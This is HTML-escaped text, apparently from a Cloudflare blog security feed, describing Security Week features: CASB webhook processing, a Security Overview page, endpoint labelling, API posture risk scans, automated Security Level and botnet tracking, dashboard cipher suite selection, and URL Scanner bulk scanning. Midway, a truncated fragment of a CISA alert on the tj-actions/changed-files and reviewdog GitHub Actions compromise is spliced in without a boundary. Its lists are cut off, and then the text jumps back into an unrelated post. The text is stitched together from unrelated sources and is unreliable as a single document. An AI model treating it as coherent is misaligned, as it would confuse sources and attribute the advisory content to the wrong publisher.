forward.&lt;/p&gt;&lt;h5&gt;Listening for update events from Cloudflare Workers&lt;/h5&gt;&lt;p&gt;Cloudflare Workers serve as the entry point for vendor webhooks, handling asset change notifications from external services. The workflow unfolds as follows:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Webhook listener:&lt;/b&gt; An initial Worker acts as the webhook listener, receiving asset change messages from vendors.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Data storage &amp;amp; queuing:&lt;/b&gt; Upon receiving a message, the Worker uploads the raw payload of the change notification to Cloudflare R2 for persistence, and publishes it to a Cloudflare Queue dedicated to raw asset changes.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Transformation Worker:&lt;/b&gt; A second Worker, bound as a consumer to the raw asset change queue, processes the incoming messages. This Worker transforms the raw vendor-specific data into a generic format suitable for CASB. The transformed data is then:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;Stored in Cloudflare R2 for future reference.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;Published on another Cloudflare Queue, designated for transformed messages.&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h5&gt;CASB Processing: Consumers &amp;amp; Crawlers&lt;/h5&gt;&lt;p&gt;Once the transformed messages reach the CASB layer, they undergo further processing:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Polling consumer:&lt;/b&gt; CASB has a consumer that polls the transformed message queue. Upon receiving a message, it determines the relevant handler required for processing.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Crawler execution:&lt;/b&gt; The handler then maps the message to an appropriate crawler, which interacts with the vendor API to fetch the most up-to-date asset details.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Data storage:&lt;/b&gt; The retrieved asset data is stored in the CASB database, ensuring it is accessible for security and compliance checks.&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;With this improvement, we are now processing 10 to 20 Microsoft updates per second, or 864,000 to 1.72 million updates daily, giving customers incredibly fast visibility into their environment. Look out for expansion to other SaaS vendors in the coming months. &lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Securing your web applications&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#securing-your-web-applications"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;A unique challenge of securing web applications is that no one size fits all. An asset-aware posture management bridges the gap between a universal security solution and unique business needs, offering tailored recommendations for security teams to protect what matters.&lt;/p&gt;&lt;h4&gt;Posture overview from attacks to threats and risks&lt;/h4&gt;&lt;p&gt;Starting today, all Cloudflare customers have access to Security Overview, a new landing page customized for each of your onboarded domains. This page aggregates and prioritizes security suggestions across all your web applications:&lt;/p&gt;&lt;ol&gt;&lt;li&gt;&lt;p&gt;Any (ongoing) attacks detected that require immediate attention&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;Disposition (mitigated, served by Cloudflare, served by origin) of all proxied traffic over the last 7 days&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;Summary of currently active security modules that are detecting threats&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;Suggestions of how to improve your security posture with a step-by-step guide&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;And a glimpse of your most active and lately updated security rules&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/3YhmhUZbZbAIZryUuTodpV/2b9563ac7768348bb4be46abc5fef7b3/4.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;These tailored security suggestions are surfaced based on your traffic profile and business needs, which is made possible by discovering your proxied web assets.&lt;/p&gt;&lt;h4&gt;Discovery of web assets&lt;/h4&gt;&lt;p&gt;Many web applications, regardless of their industry or use case, require similar functionality: user identification, accepting payment information, etc. By discovering the assets serving this functionality, we can build and run targeted threat detection to protect them in depth.&lt;/p&gt;&lt;p&gt;As an example, bot traffic towards marketing pages versus login pages have different business impacts. Content scraping may be happening targeting your marketing materials, which you may or may not want to allow, while credential stuffing on your login page deserves immediate attention.&lt;/p&gt;&lt;p&gt;Web assets are described by a list of endpoints; and labelling each of them defines their business goals. A simple example can be &lt;code&gt;POST&lt;/code&gt; requests to path &lt;code&gt;/portal/login&lt;/code&gt;, which likely describes an API for user authentication. While the &lt;code&gt;GET&lt;/code&gt; requests to path &lt;code&gt;/portal/login&lt;/code&gt; denote the actual login webpage.&lt;/p&gt;&lt;p&gt;To describe business goals of endpoints, labels come into play. &lt;code&gt;POST&lt;/code&gt; requests to the &lt;code&gt;/portal/login&lt;/code&gt; endpoint serving end users and to the&lt;code&gt; /api/admin/login&lt;/code&gt; endpoint used by employees can both can be labelled using the same &lt;code&gt;cf-log-in&lt;/code&gt; &lt;a href="https://developers.cloudflare.com/api-shield/management-and-monitoring/endpoint-labels/#managed-labels"&gt;&lt;u&gt;managed label&lt;/u&gt;&lt;/a&gt;, letting Cloudflare know that usernames and passwords would be expected to be sent to these endpoints.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/7jFh9mc7hyryXHIqeQwS9U/25ba022282b43cff9f09700d0ae81c76/5.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;API Shield customers can already make use of &lt;a href="https://developers.cloudflare.com/api-shield/management-and-monitoring/endpoint-labels/"&gt;&lt;u&gt;endpoint labelling&lt;/u&gt;&lt;/a&gt;. In early Q2 2025, we are adding label discovery and suggestion capabilities, starting with three labels, &lt;code&gt;cf-log-in&lt;/code&gt;, &lt;code&gt;cf-sign-up&lt;/code&gt;, and &lt;code&gt;cf-rss-feed&lt;/code&gt;. All other customers can manually add these labels to the &lt;a href="https://developers.cloudflare.com/api-shield/management-and-monitoring/"&gt;&lt;u&gt;saved endpoints&lt;/u&gt;&lt;/a&gt;. One example, explained below, is preventing disposable emails from being used during sign-ups. &lt;/p&gt;&lt;h4&gt;Always-on threat detection and risk assessment&lt;/h4&gt;&lt;h5&gt;Use-case driven threat detection&lt;/h5&gt;&lt;p&gt;Customers told us that, with the growing excitement around generative AI, they need support to secure this new technology while not hindering innovation. Being able to discover LLM-powered services allows fine-tuning security controls that are relevant for this particular technology, such as inspecting prompts, limit prompting rates based on token usage, etc. In a separate Security Week blog post, we will share how we build Cloudflare Firewall for AI, and how you can easily protect your generative AI workloads.&lt;/p&gt;&lt;p&gt;Account fraud detection, which encompasses multiple attack vectors, is another key area that we are focusing on in 2025.&lt;/p&gt;&lt;p&gt;On many login and signup pages, a &lt;a href="https://www.cloudflare.com/learning/bots/how-captchas-work/"&gt;&lt;u&gt;CAPTCHA&lt;/u&gt;&lt;/a&gt; solution is commonly used to only allow human beings through, assuming only bots perform undesirable actions. Put aside that most visual CAPTCHA puzzles can be easily &lt;a href="https://arstechnica.com/ai/2024/09/ai-defeats-traffic-image-captcha-in-another-triumph-of-machine-over-man/"&gt;&lt;u&gt;solved by AI&lt;/u&gt;&lt;/a&gt; nowadays, such an approach cannot effectively solve the &lt;i&gt;root cause&lt;/i&gt; of most account fraud vectors. For example, human beings using disposable emails to sign up single-use accounts to take advantage of signup promotions.&lt;/p&gt;&lt;p&gt;To solve this fraudulent sign up issue, a security rule currently under development could be deployed as below to block all attempts that use disposable emails as a user identifier, regardless of whether the requester was automated or not. All existing or future &lt;code&gt;cf-log-in&lt;/code&gt; and &lt;code&gt;cf-sign-up&lt;/code&gt; labelled endpoints are protected by this single rule, as they both require user identification.&lt;/p&gt;
          &lt;figure&gt;

          &lt;/figure&gt;&lt;p&gt;Our fast expanding use-case driven threat detections are all running by default, from the first moment you onboarded your traffic to Cloudflare. The instant available detection results can be reviewed through security analytics, helping you make swift informed decisions.&lt;/p&gt;&lt;h5&gt;API endpoint risk assessment&lt;/h5&gt;&lt;p&gt;APIs have their own set of risks and vulnerabilities, and today Cloudflare is delivering seven new risk scans through API Posture Management. This new capability of API Shield helps reduce risk by identifying security issues and fixing them early, before APIs are attacked. Because APIs are typically made up of many different backend services, security teams need to pinpoint which backend service is vulnerable so that development teams may remediate the identified issues.&lt;/p&gt;&lt;p&gt;Our new API posture management risk scans do exactly that: users can quickly identify which API endpoints are at risk to a number of vulnerabilities, including sensitive data exposure, authentication status, &lt;a href="https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/"&gt;&lt;u&gt;Broken Object Level Authorization (BOLA)&lt;/u&gt;&lt;/a&gt; attacks, and more.&lt;/p&gt;&lt;p&gt;Authentication Posture is one risk scan you’ll see in the new system. We focused on it to start with because sensitive data is at risk when API authentication is assumed to be enforced but is actually broken. &lt;a href="https://developers.cloudflare.com/api-shield/security/authentication-posture/"&gt;&lt;u&gt;Authentication Posture&lt;/u&gt;&lt;/a&gt; helps customers identify authentication misconfigurations for APIs and alerts of their presence. This is achieved by scanning for successful requests against the API and noting their authentication status. API Shield scans traffic daily and labels API endpoints that have missing and mixed authentication for further review.&lt;/p&gt;&lt;p&gt;For customers that have configured session IDs in API Shield, you can find the new risk scan labels and authentication details per endpoint in API Shield. Security teams can take this detail to their development teams to fix the broken authentication.&lt;/p&gt;

          &lt;/figure&gt;&lt;p&gt;We’re launching today with &lt;a href="https://developers.cloudflare.com/api-shield/management-and-monitoring/endpoint-labels/"&gt;&lt;u&gt;scans&lt;/u&gt;&lt;/a&gt; for authentication posture, sensitive data, underprotected APIs, BOLA attacks, and anomaly scanning for API performance across errors, latency, and response size.&lt;/p&gt;

            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Achieving a good security posture in a fast-moving environment requires innovative solutions that can transform complexity into simplicity. Bringing together the ability to continuously assess threats and risks across both public and private IT environments through a single platform is our first step in supporting our customers’ efforts to maintain a healthy security posture.&lt;/p&gt;&lt;p&gt;To further enhance the relevance of security insights and suggestions provided and help you better prioritize your actions, we are looking into integrating Cloudflare’s global view of threat landscapes. With this, you gain additional perspectives, such as what the biggest threats to your industry are, and what attackers are targeting at the current moment.

The supply chain compromise allows for information disclosure of secrets including, but not limited to, valid access keys, GitHub Personal Access Tokens (PATs), npm tokens, and private RSA keys. This has been patched in v46.0.1.&amp;nbsp;&lt;/p&gt;


&lt;p&gt;&lt;em&gt;&lt;strong&gt;(Updated March 19, 2025) &lt;/strong&gt;&lt;/em&gt;The compromise of tj-actions/changed-files was potentially enabled by a compromise of another GitHub Action, reviewdog/action-setup@v1 (tracked as &lt;a class="Hyperlink SCXW260638697 BCX8" href="https://www.cve.org/CVERecord?id=CVE-2025-30154" rel="noreferrer noopener" target="_blank"&gt;CVE-2025-30154&lt;/a&gt;), which occurred around the same time. The following Actions may also be affected: &amp;nbsp;&lt;/p&gt;


&lt;ul&gt;

&lt;p&gt;CISA strongly urges users to implement the following recommendations to mitigate this compromise. If your organization is impacted:&amp;nbsp;&amp;nbsp;&lt;/p&gt;


&lt;p&gt;&lt;em&gt;&lt;strong&gt;(Updated March 26, 2025)&lt;/strong&gt;&lt;/em&gt;&amp;nbsp;&lt;/p&gt;


&lt;ul&gt;
&lt;li&gt;Identify affected repositories. Conduct an audit to locate all projects using all versions of tj-actions/changed-files between 2025-03-12 00:00 UTC to 2025-03-15 12:00 UTC in your organization and/or the reviewdog/action between March 11, 2025, between 18:42 and 20:31 UTC.&amp;nbsp;&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;


&lt;ul&gt;
&lt;li&gt;Identify exposed secrets. For public repositories with workflows that ran the malicious commit, check for exposed access keys, GitHub Personal Access Tokens (PATs), npm tokens, and private RSA keys. Note: Secrets may be obfuscated as a double-encoded base64 payload.&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;


&lt;ul&gt;
&lt;li&gt;Rotate all identified secrets immediately as they should be considered compromised.&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;


&lt;ul&gt;
&lt;li&gt;Update to latest version&lt;strong&gt; &lt;/strong&gt;of&lt;strong&gt; &lt;/strong&gt;&lt;a class="Hyperlink SCXW260638697 BCX8" href="https://github.com/reviewdog/action-setup/commit/3f401fe" rel="noreferrer noopener" target="_blank"&gt;reviewdog/action-setup@3f401fe&lt;/a&gt; and/or follow &lt;a href="https://github.com/tj-actions/changed-files/blob/45fb12d7a8bedb4da42342e52fe054c6c2c3fd73/README.md?plain=1#L20-L28" target="_blank"&gt;these instructions&lt;/a&gt; provided by GitHub.&lt;/li&gt;

This Security Week, Cloudflare unveils automated botnet protection, flexible cipher suites, and an upgraded URL Scanner.</description><content:encoded>&lt;p&gt;At Cloudflare, we are constantly innovating and launching new features and capabilities across our product portfolio. Today, we're releasing a number of new features aimed at improving the security tools available to our customers.&lt;/p&gt;&lt;p&gt;&lt;b&gt;Automated security level: &lt;/b&gt;Cloudflare’s Security Level setting has been improved and no longer requires manual configuration. By integrating botnet data along with other request rate signals, all customers are protected from confirmed known malicious botnet traffic without any action required.&lt;/p&gt;&lt;p&gt;&lt;b&gt;Cipher suite selection:&lt;/b&gt; You now have greater control over encryption settings via the Cloudflare dashboard, including specific cipher suite selection based on our client or compliance requirements.&lt;/p&gt;&lt;p&gt;&lt;b&gt;Improved URL scanner:&lt;/b&gt; New features include bulk scanning, similarity search, location picker and more.&lt;/p&gt;&lt;p&gt;These updates are designed to give you more power and flexibility when managing online security, from proactive threat detection to granular control over encryption settings.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Automating Security Level to provide stronger protection for all&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#automating-security-level-to-provide-stronger-protection-for-all"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Cloudflare’s &lt;a href="https://developers.cloudflare.com/waf/tools/security-level/"&gt;&lt;u&gt;Security Level feature&lt;/u&gt;&lt;/a&gt; was designed to protect customer websites from malicious activity.&lt;/p&gt;&lt;p&gt;Available to all Cloudflare customers, including the free tier, it has always had very simple logic: if a connecting client IP address has shown malicious behavior across our network, issue a &lt;a href="https://developers.cloudflare.com/waf/reference/cloudflare-challenges/"&gt;&lt;u&gt;managed challenge&lt;/u&gt;&lt;/a&gt;. The system tracks malicious behavior by assigning a threat score to each IP address. The more bad behavior is observed, the higher the score. Cloudflare customers could configure &lt;a href="https://developers.cloudflare.com/waf/tools/security-level/"&gt;&lt;u&gt;the threshold that would trigger the challenge&lt;/u&gt;&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;We are now announcing an update to how Security Level works, by combining the IP address threat signal with threshold and botnet data. The resulting detection improvements have allowed us to automate the configuration, no longer requiring customers to set a threshold.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/1RFWQl2Da9xu9MdfbJCRhy/8750770351d124ecf8d2f2b274f2e3cc/image1.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;The Security Level setting is now &lt;b&gt;Always protected&lt;/b&gt; in the dashboard, and ip_threat_score fields in WAF Custom Rules will no longer be populated. No change is required by Cloudflare customers. The &lt;a href="https://developers.cloudflare.com/fundamentals/reference/under-attack-mode/"&gt;&lt;u&gt;“I am under attack”&lt;/u&gt;&lt;/a&gt; option remains unchanged.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Stronger protection, by default, for all customers&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#stronger-protection-by-default-for-all-customers"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Although we always favor simplicity, privacy-related services, including our own WARP, have seen growing use. Meanwhile, &lt;a href="https://en.wikipedia.org/wiki/Carrier-grade_NAT"&gt;&lt;u&gt;carrier-grade network address translation (CGNATs)&lt;/u&gt;&lt;/a&gt; and outbound forward proxies have been widely used for many years.&lt;/p&gt;&lt;p&gt;These services often result in multiple users sharing the same IP address, which can lead to legitimate users being challenged unfairly since individual addresses don’t strictly correlate with unique client behavior. Moreover, threat actors have become increasingly adept at anonymizing and dynamically changing their IP addresses using tools like VPNs, proxies, and botnets, further diminishing the reliability of IP addresses as a standalone indicator of malicious activity. Recognising these limitations, it was time for us to revisit Security Level’s logic to reduce the number of false positives being observed.&lt;/p&gt;&lt;p&gt;In February 2024, we introduced a new security system that automatically combines the real-time DDoS score with a traffic threshold and a botnet tracking system. The real-time DDoS score is part of our autonomous DDoS detection system, which analyzes traffic patterns to identify potential threats. This system superseded and replaced the existing Security Level logic, and is deployed on all customer traffic, including free plans. After thorough monitoring and analysis over the past year, we have confirmed that these behavior-based mitigation systems provide more accurate results. Notably, we've observed a significant reduction in false positives, demonstrating the limitations of the previous IP address-only logic.&lt;/p&gt;&lt;h4&gt;Better botnet tracking&lt;/h4&gt;&lt;p&gt;Our new logic combines IP address signals with behavioral and threshold indicators to improve the accuracy of botnet detection. While IP addresses alone can be unreliable due to potential false positives, we enhance their utility by integrating them with additional signals. We monitor surges in traffic from known "bad" IP addresses and further refine this data by examining specific properties such as path, accept, and host headers.&lt;/p&gt;&lt;p&gt;We also introduced a new botnet tracking system that continuously detects and tracks botnet activity across the Cloudflare network. From our unique vantage point as a &lt;a href="https://w3techs.com/technologies/overview/proxy"&gt;&lt;u&gt;reverse proxy for nearly 20% of all websites&lt;/u&gt;&lt;/a&gt;, we maintain a dynamic database of IP addresses associated with botnet activity. This database is continuously updated, enabling us to automatically respond to emerging threats without manual intervention. This effect is visible in the &lt;a href="https://radar.cloudflare.com/security-and-attacks?dateStart=2024-02-01&amp;amp;dateEnd=2024-03-31#mitigated-traffic-sources"&gt;&lt;u&gt;Cloudflare Radar chart&lt;/u&gt;&lt;/a&gt; below, as we saw sharp growth in DDoS mitigations in February 2024 as the botnet tracking system was implemented.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/3yOP8zoC5ZLVi4WHnXI0jH/ef3fd6ad10e8357b6b4f1bfb90e6d6b6/image4.png" /&gt;
          &lt;/figure&gt;&lt;h4&gt;What it means for our customers and their users&lt;/h4&gt;&lt;p&gt;Customers now get better protection while having to manage fewer configurations, and they can rest assured that their online presence remains fully protected. These security measures are integrated and enabled by default across all of our plans, ensuring protection without the need for manual configuration or rule management.
This improvement is particularly beneficial for users accessing sites through proxy services or CGNATs, as these setups can sometimes trigger unnecessary security checks, potentially disrupting access to websites.&lt;/p&gt;&lt;h4&gt;What’s next&lt;/h4&gt;&lt;p&gt;Our team is looking at defining the next generation of threat scoring mechanisms. This initiative aims to provide our customers with more relevant and effective controls and tools to combat today's and tomorrow's potential security threats.&lt;/p&gt;&lt;p&gt;Effective March 17, 2025, we are removing the option to configure manual rules using the threat score parameter in the Cloudflare dashboard. The "I'm Under Attack" mode remains available, allowing users to issue managed challenges to all traffic when needed.&lt;/p&gt;&lt;p&gt;By the end of Q1 2026, we anticipate disabling all rules that rely on IP threat score. This means that using the threat score parameter in the Rulesets API and via Terraform won’t be available after the end of the transition period. However, we encourage customers to be proactive and edit or remove the rules containing the threat score parameter starting today.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Cipher suite selection now available in the UI&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#cipher-suite-selection-now-available-in-the-ui"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/2e5Q0ghzpkuTQrR335fzIa/156b9531735fd9164768970fd08f5f85/image5.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;Building upon our core security features, we're also giving you more control over your encryption: cipher suite selection is now available in the Cloudflare dashboard! &lt;/p&gt;&lt;p&gt;When a client initiates a visit to a Cloudflare-protected website, a &lt;a href="https://www.cloudflare.com/learning/ssl/what-happens-in-a-tls-handshake/"&gt;&lt;u&gt;TLS handshake&lt;/u&gt;&lt;/a&gt; occurs, where clients present a list of supported &lt;a href="https://developers.cloudflare.com/ssl/edge-certificates/additional-options/cipher-suites/"&gt;&lt;u&gt;cipher suites&lt;/u&gt;&lt;/a&gt; — cryptographic algorithms crucial for secure connections. While newer algorithms enhance security, balancing this with broad compatibility is key, as some customers prioritise reach by supporting older devices, even with less secure ciphers. To accommodate varied client needs, Cloudflare's default settings emphasise wide compatibility, allowing customers to tailor cipher suite selection based on their priorities: strong security, compliance (PCI DSS, FIPS 140-2), or legacy device support.&lt;/p&gt;&lt;p&gt;Previously, customizing cipher suites required multiple API calls, proving cumbersome for many users. Now, Cloudflare introduces Cipher Suite Selection to the dashboard. This feature introduces user-friendly selection flows like security recommendations, compliance presets, and custom selections.  &lt;/p&gt;&lt;h4&gt;Understanding cipher suites&lt;/h4&gt;&lt;p&gt;Cipher suites are collections of cryptographic algorithms used for key exchange, authentication, encryption, and message integrity, essential for a TLS handshake. During the handshake’s initiation, the client sends a "client hello" message containing a list of supported cipher suites. The server responds with a "server hello" message, choosing a cipher suite from the client's list based on security and compatibility. This chosen cipher suite forms the basis of TLS termination and plays a crucial role in establishing a secure HTTPS connection. Here’s a quick overview of each component:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Key exchange algorithm:&lt;/b&gt; Secures the exchange of encryption keys between parties.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Authentication algorithm:&lt;/b&gt; Verifies the identities of the communicating parties.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Encryption algorithm:&lt;/b&gt; Ensures the confidentiality of the data.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Message integrity algorithm:&lt;/b&gt; Confirms that the data remains unaltered during transmission.&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://www.geeksforgeeks.org/perfect-forward-secrecy/"&gt;&lt;b&gt;&lt;u&gt;Perfect forward secrecy&lt;/u&gt;&lt;/b&gt;&lt;/a&gt;&lt;b&gt; &lt;/b&gt;is an important feature of modern cipher suites. It ensures that each session's encryption keys are generated independently, which means that even if a server’s private key is compromised in the future, past communications remain secure.&lt;/p&gt;&lt;h4&gt;What we are offering &lt;/h4&gt;&lt;p&gt;You can find cipher suite configuration under Edge Certificates in your zone’s SSL/TLS dashboard. There, you will be able to view your allow-listed set of cipher suites. &lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/6fT7BvPow3zvKTl1JYw7yX/8dcd8b797f671b05211defaaf4c4bb83/image5.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;Additionally, you will be able to choose from three different user flows, depending on your specific use case, to seamlessly select your appropriate list. Those three user flows are: security recommendation selection, compliance selection, or custom selection. The goal of the user flows is to outfit customers with cipher suites that match their goals and priorities, whether those are maximum compatibility or best possible security.&lt;/p&gt;&lt;p&gt;1. Security recommendations &lt;/p&gt;&lt;p&gt;To streamline the process, we have turned our &lt;a href="https://developers.cloudflare.com/ssl/reference/cipher-suites/recommendations/"&gt;&lt;u&gt;cipher suites recommendations&lt;/u&gt;&lt;/a&gt; into selectable options. This is in an effort to expose our customers to cipher suites in a tangible way and enable them to choose between different security configurations and compatibility. Here is what they mean:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Modern:&lt;/b&gt; Provides the highest level of security and performance with support for Perfect Forward Secrecy and &lt;a href="https://www.ietf.org/archive/id/draft-irtf-cfrg-aead-properties-03.html"&gt;&lt;u&gt;Authenticated Encryption (AEAD)&lt;/u&gt;&lt;/a&gt;. Ideal for customers who prioritize top-notch security and performance, such as financial institutions, healthcare providers, or government agencies. This selection requires TLS 1.3 to be enabled and the minimum TLS version set to 1.2.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Compatible:&lt;/b&gt; Balances security and compatibility by offering forward-secret cipher suites that are broadly compatible with older systems. Suitable for most customers who need a good balance between security and reach. This selection also requires TLS 1.3 to be enabled and the minimum TLS version set to 1.2.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Legacy:&lt;/b&gt; Optimizes for the widest reach, supporting a wide range of legacy devices and systems. Best for customers who do not handle sensitive data and need to accommodate a variety of visitors. This option is ideal for blogs or organizations that rely on older systems.&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;2. Compliance selection&lt;/p&gt;&lt;p&gt;Additionally, we have also turned our &lt;a href="https://developers.cloudflare.com/ssl/reference/cipher-suites/compliance-status/"&gt;&lt;u&gt;compliance recommendations&lt;/u&gt;&lt;/a&gt; into selectable options to make it easier for our customers to meet their PCI DSS or FIPS-140-2 requirements.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;&lt;a href="https://www.pcisecuritystandards.org/standards/pci-dss/"&gt;&lt;b&gt;&lt;u&gt;PCI DSS Compliance:&lt;/u&gt;&lt;/b&gt;&lt;/a&gt; Ensures that your cipher suite selection aligns with PCI DSS standards for protecting cardholder data. This option will enforce a requirement to set a minimum TLS version of 1.2, and TLS 1.3 to be enabled, to maintain compliance.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;Since the list of supported cipher suites require TLS 1.3 to be enabled and a minimum TLS version of 1.2 in order to be compliant, we will disable compliance selection until the zone settings are updated to meet those requirements. This effort is to ensure that our customers are truly compliant and have the proper zone settings to be so. &lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;a href="https://csrc.nist.gov/pubs/fips/140-2/upd2/final"&gt;&lt;b&gt;&lt;u&gt;FIPS 140-2 Compliance&lt;/u&gt;&lt;/b&gt;&lt;u&gt;:&lt;/u&gt;&lt;/a&gt; Tailored for customers needing to meet federal security standards for cryptographic modules. Ensures that your encryption practices comply with FIPS 140-2 requirements.&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;3. Custom selection &lt;/p&gt;&lt;p&gt;For customers needing precise control, the custom selection flow allows individual cipher suite selection, excluding TLS 1.3 suites which are automatically enabled with TLS 1.3. To prevent disruptions, guardrails ensure compatibility by validating that the minimum TLS version aligns with the selected cipher suites and that the SSL/TLS certificate is compatible (e.g., RSA certificates require RSA cipher suites).&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;API &lt;/h3&gt;

          &lt;/div&gt;
        &lt;p&gt;The &lt;a href="https://developers.cloudflare.com/ssl/edge-certificates/additional-options/cipher-suites/"&gt;&lt;u&gt;API&lt;/u&gt;&lt;/a&gt; will still be available to our customers. This aims to support an existing framework, especially to customers who are already API reliant. Additionally, Cloudflare preserves the specified cipher suites in the order they are set via the API and that control of ordering will remain unique to our API offering. &lt;/p&gt;&lt;p&gt;With your Advanced Certificate Manager or Cloudflare for SaaS subscription, head to Edge Certificates in your zone’s SSL dashboard and give it a try today!&lt;/p&gt;

          &lt;/figure&gt;&lt;p&gt;Cloudflare's URL Scanner is a tool designed to detect and analyze potential security threats like phishing and malware by scanning and evaluating websites, providing detailed insights into their safety and technology usage. We've leveraged our own &lt;a href="https://developers.cloudflare.com/radar/investigate/url-scanner/"&gt;&lt;u&gt;URL Scanner&lt;/u&gt;&lt;/a&gt; to enhance our internal &lt;u&gt;Trust &amp;amp; Safety efforts&lt;/u&gt;, automating the detection and mitigation of some forms of abuse on our platform. This has not only strengthened our own security posture, but has also directly influenced the development of the new features we're announcing today. &lt;/p&gt;&lt;p&gt;Phishing attacks are on the rise across the Internet, and we saw a major opportunity to be "customer zero" for our URL Scanner to address abuse on our own network. By working closely with our Trust &amp;amp; Safety team to understand how the URL Scanner could better identify potential phishing attempts, we've improved the speed and accuracy of our response to abuse reports, making the Internet safer for everyone. Today, we're excited to share the new API version and the latest updates to URL Scanner, which include the ability to scan from specific geographic locations, bulk scanning, search by Indicators of Compromise (IOCs), improved UI and information display, comprehensive IOC listings, advanced sorting options, and more. These features are the result of our own experiences in leveraging URL Scanner to safeguard our platform and our customers, and we're confident that they will prove useful to our security analysts and threat intelligence users.&lt;/p&gt;&lt;h4&gt;Scan up to 100 URLs at once by using bulk submissions&lt;/h4&gt;&lt;p&gt;Cloudflare Enterprise customers can now conduct routine scans of their web assets to identify emerging vulnerabilities, ensuring that potential threats are addressed proactively, by using the &lt;a href="https://developers.cloudflare.com/api/resources/url_scanner/subresources/scans/methods/bulk_create/"&gt;&lt;u&gt;Bulk Scanning API endpoint&lt;/u&gt;&lt;/a&gt;. Another use case for the bulk scanning functionality is developers leveraging bulk scanning to verify that all URLs your team is accessing are secure and free from potential exploits before launching new websites or updates.&lt;/p&gt;&lt;p&gt;Scanning of multiple URLs addresses the specific needs of our users engaged in threat hunting. Many of them maintain extensive lists of URLs that require swift investigation to identify potential threats. Currently, they face the task of submitting these URLs one by one, which not only slows down their workflow but also increases the manual effort involved in their security processes. With the introduction of bulk submission capabilities, users can now submit up to 100 URLs at a time for scanning. &lt;/p&gt;&lt;h4&gt;How we built the bulk scanning feature&lt;/h4&gt;&lt;p&gt;Let’s look at a regular workflow:&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/6l8aN6xhN4HEfw4ZMi1MT8/5eb62472b42f75487c55b17b3415b584/image6.png" /&gt;
